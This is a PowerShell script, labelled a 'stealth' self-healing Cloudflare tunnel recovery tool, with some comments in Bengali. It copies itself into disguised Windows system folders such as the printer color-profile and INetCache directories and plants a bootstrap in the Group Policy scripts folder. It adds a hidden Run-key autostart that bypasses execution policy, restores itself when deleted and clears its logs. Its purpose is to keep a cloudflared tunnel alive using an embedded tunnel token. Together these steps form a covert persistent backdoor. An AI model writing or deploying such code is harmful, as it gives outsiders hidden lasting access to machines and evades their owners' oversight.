# ============================================
# SELF-HEALING CLOUDFLARE TUNNEL RECOVERY
# Auto-backup + self-restore + Master Copy
# Stealth Version - Three different system folders
# ============================================

# ===== CONFIGURATION =====
$TunnelToken = "eyJhIjoiN2JmYTc3Njg4NDNhNGQyZTQ1MjU3NWM5Yjc0MDFkYTUiLCJ0IjoiNGU1OTcxMTktMmMyMi00NzI1LWJiYjgtZTY3MWQyODkxZjMwIiwicyI6Ik5qbGhPVFkxT0RBdE16azFNeTAwWldWaExUazJZV0l0TW1JMU16VTBaVGRrWkRJMSJ9"

# ===== PATHS (Stealth) =====
$ScriptPath = $MyInvocation.MyCommand.Path
$MasterScriptPath = "C:\Windows\System32\spool\drivers\color\cf-recovery.ps1"
$BackupPath = "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\cf-recovery.backup.ps1"
$ServiceName = "cloudflared"
$ExePath = "C:\Program Files (x86)\cloudflared\cloudflared.exe"
$MsiUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.msi"
$MsiFile = "$env:TEMP\cloudflared.msi"
$LogDir = "C:\Windows\System32\spool\drivers\color\logs"
$LogFile = "$LogDir\recovery.log"
$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
$RetryFlag = "$LogDir\retry_needed.flag"

# ===== CREATE DIRECTORIES =====
$null = New-Item -Path $LogDir -ItemType Directory -Force
$null = New-Item -Path "C:\Windows\System32\spool\drivers\color" -ItemType Directory -Force

# ===== SELF-INSTALL TO MASTER LOCATION =====
function Install-Self {
    # যদি স্ক্রিপ্ট টেম্প বা অন্য কোনো জায়গা থেকে চলে, তবে নিজেকে মাস্টার লোকেশনে কপি করো
    if ($ScriptPath -ne $MasterScriptPath) {
        if (Test-Path $ScriptPath) {
            Copy-Item -Path $ScriptPath -Destination $MasterScriptPath -Force
        }
    }
    # সবসময় ব্যাকআপ আপডেট রাখো
    if (Test-Path $MasterScriptPath) {
        Copy-Item -Path $MasterScriptPath -Destination $BackupPath -Force
    }
}

# ===== LOG FUNCTION =====
function Write-Log {
    param([string]$Message)
    $Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $LogFile -Value "$Time - $Message"
}

Write-Log "========== TUNNEL RECOVERY STARTED =========="

# ===== SELF-PRESERVATION (স্টেপ ১: মাস্টার কপি তৈরি) =====
Install-Self

# ===== CLEAR OLD LOGS (OLDER THAN 24 HOURS) =====
function Clear-OldLogs {
    $cutoff = (Get-Date).AddHours(-24)
    if (Test-Path $LogFile) {
        $fileAge = (Get-Item $LogFile).LastWriteTime
        if ($fileAge -lt $cutoff) {
            Remove-Item $LogFile -Force
        }
    }
    Get-ChildItem -Path $LogDir -Filter "*.log" -ErrorAction SilentlyContinue | ForEach-Object {
        if ($_.LastWriteTime -lt $cutoff) {
            Remove-Item $_.FullName -Force
        }
    }
}
Clear-OldLogs

# ===== DEEP CLEANUP =====
function Deep-Cleanup {
    Write-Log "Performing deep cleanup..."
    Stop-Service $ServiceName -Force -ErrorAction SilentlyContinue
    & $ExePath service uninstall 2>&1 | Out-Null
    Start-Sleep -Seconds 2

    $regPaths = @(
        "HKLM:\SYSTEM\CurrentControlSet\Services\$ServiceName",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\*\Products\*cloudflared*",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*cloudflared*"
    )
    foreach ($reg in $regPaths) {
        if (Test-Path $reg) {
            Remove-Item -Path $reg -Recurse -Force -ErrorAction SilentlyContinue
            Write-Log "Removed registry: $reg"
        }
    }

    $installDir = "C:\Program Files (x86)\cloudflared"
    if (Test-Path $installDir) {
        Takeown /f $installDir /r /d y 2>&1 | Out-Null
        icacls $installDir /grant administrators:F /t 2>&1 | Out-Null
        Remove-Item -Path $installDir -Recurse -Force -ErrorAction SilentlyContinue
        Write-Log "Removed directory: $installDir"
    }

    $configDirs = @(
        "C:\ProgramData\cloudflared",
        "$env:USERPROFILE\.cloudflared",
        "C:\Windows\System32\config\systemprofile\.cloudflared"
    )
    foreach ($dir in $configDirs) {
        if (Test-Path $dir) {
            Remove-Item -Path $dir -Recurse -Force -ErrorAction SilentlyContinue
            Write-Log "Removed directory: $dir"
        }
    }

    Start-Process msiexec.exe -ArgumentList "/unregister" -Wait -NoNewWindow
    Start-Sleep -Seconds 2
    Start-Process msiexec.exe -ArgumentList "/regserver" -Wait -NoNewWindow
    Start-Sleep -Seconds 2

    Write-Log "Deep cleanup completed."
}

# ===== INSTALL WITH RETRY =====
function Install-WithCleanup {
    Write-Log "Attempting installation..."
    $install = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart" -Wait -PassThru
    $exitCode = $install.ExitCode

    if ($exitCode -eq 0 -or $exitCode -eq 3010) {
        Write-Log "Installation succeeded (exit code: $exitCode)"
        return $true
    }
    elseif ($exitCode -eq 1603) {
        Write-Log "Installation failed with 1603 - performing deep cleanup and retry"
        Deep-Cleanup
        Start-Sleep -Seconds 3
        Write-Log "Retrying installation after cleanup..."
        $retryInstall = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart" -Wait -PassThru
        $retryCode = $retryInstall.ExitCode
        if ($retryCode -eq 0 -or $retryCode -eq 3010) {
            Write-Log "Retry succeeded (exit code: $retryCode)"
            return $true
        }
        else {
            Write-Log "Retry failed with exit code: $retryCode"
            return $false
        }
    }
    else {
        Write-Log "Installation failed with exit code: $exitCode"
        return $false
    }
}

# ===== RESTORE TUNNEL =====
function Restore-Tunnel {
    Write-Log "Starting recovery process..."
    
    Write-Log "Downloading cloudflared MSI..."
    try {
        Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiFile -UseBasicParsing
        Write-Log "MSI downloaded successfully"
    }
    catch {
        Write-Log "MSI download failed: $_"
        return $false
    }
    
    $installSuccess = Install-WithCleanup
    if (-not $installSuccess) {
        Write-Log "Installation failed - will retry on next boot"
        Set-Content -Path $RetryFlag -Value "Retry needed"
        return $false
    }
    
    Start-Sleep -Seconds 5
    
    if (Get-Service -Name $ServiceName -ErrorAction SilentlyContinue) {
        Write-Log "Removing existing service..."
        & $ExePath service uninstall 2>&1 | Out-Null
        Start-Sleep -Seconds 2
    }
    
    Write-Log "Installing tunnel service..."
    $result = & $ExePath service install $TunnelToken 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Log "Service installation failed: $result"
        Set-Content -Path $RetryFlag -Value "Retry needed"
        return $false
    }
    Write-Log "Service installed successfully"
    
    Write-Log "Starting tunnel service..."
    Start-Service $ServiceName -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 3
    
    Write-Log "Recovery completed successfully"
    
    if (Test-Path $RetryFlag) { Remove-Item $RetryFlag -Force }
    
    return $true
}

# ===== CHECK TUNNEL HEALTH =====
function Test-TunnelHealth {
    if (-not (Test-Path $ExePath)) {
        Write-Log "cloudflared.exe not found"
        return $false
    }
    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if (-not $service) {
        Write-Log "Service not installed"
        return $false
    }
    if ($service.Status -ne 'Running') {
        Write-Log "Service not running (Status: $($service.Status))"
        return $false
    }
    Write-Log "Tunnel is healthy"
    return $true
}

# ===== SETUP AUTOSTART =====
function Setup-AutoStart {
    # New stealth bootstrap location (Group Policy Scripts)
    $bootstrapPath = "C:\Windows\System32\GroupPolicy\Machine\Scripts\cf-bootstrap.ps1"
    
    # Ensure bootstrap script exists
    if (-not (Test-Path $bootstrapPath)) {
        Write-Log "Bootstrap missing - creating it..."
        $bootstrapContent = @'
# BOOTSTRAP SCRIPT (Stealth)
$MainScript = "C:\Windows\System32\spool\drivers\color\cf-recovery.ps1"
$BackupScript = "C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\INetCache\cf-recovery.backup.ps1"
$LogFile = "C:\Windows\System32\spool\drivers\color\logs\bootstrap.log"

function Write-Log {
    param([string]$Message)
    $Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $LogFile -Value "$Time - $Message"
}

Write-Log "========== BOOTSTRAP STARTED =========="

if (-not (Test-Path $MainScript)) {
    Write-Log "Main script missing - attempting to restore..."
    if (Test-Path $BackupScript) {
        Copy-Item -Path $BackupScript -Destination $MainScript -Force
        Write-Log "Restored from backup"
    } else {
        Write-Log "CRITICAL: No backup found!"
    }
}

if (Test-Path $MainScript) {
    Write-Log "Starting main recovery script..."
    & $MainScript
} else {
    Write-Log "CRITICAL: Could not restore main script!"
}

Write-Log "========== BOOTSTRAP FINISHED =========="
'@
        # Ensure parent folder exists
        $bootstrapDir = Split-Path $bootstrapPath -Parent
        $null = New-Item -Path $bootstrapDir -ItemType Directory -Force
        Set-Content -Path $bootstrapPath -Value $bootstrapContent -Force
        Write-Log "Bootstrap created at $bootstrapPath"
    }
    
    # Set registry to run bootstrap
    if (-not (Test-Path $RegPath)) {
        $null = New-Item -Path $RegPath -Force
    }
    $currentValue = (Get-ItemProperty -Path $RegPath -Name "CloudflareTunnelRecovery" -ErrorAction SilentlyContinue).CloudflareTunnelRecovery
    $expectedValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$bootstrapPath`""
    
    if ($currentValue -ne $expectedValue) {
        Write-Log "Installing autostart registry entry (bootstrap)..."
        Set-ItemProperty -Path $RegPath -Name "CloudflareTunnelRecovery" -Value $expectedValue
        Write-Log "Autostart configured via registry"
    }
}

# ===== MAIN EXECUTION =====
try {
    # আবারও নিশ্চিত করা যে মাস্টার কপি ও ব্যাকআপ আছে (পুনরায় কল)
    Install-Self
    Setup-AutoStart
    
    if (-not (Test-TunnelHealth)) {
        Write-Log "Tunnel unhealthy - initiating restoration..."
        if (Restore-Tunnel) {
            Write-Log "Tunnel successfully restored"
        } else {
            Write-Log "Tunnel restoration failed - will retry on next boot"
            Set-Content -Path $RetryFlag -Value "Retry needed"
        }
    } else {
        Write-Log "Tunnel working fine, no action needed"
        if (Test-Path $RetryFlag) { Remove-Item $RetryFlag -Force }
    }
}
catch {
    Write-Log "Unhandled exception: $_"
}

Write-Log "========== RECOVERY SCRIPT FINISHED =========="
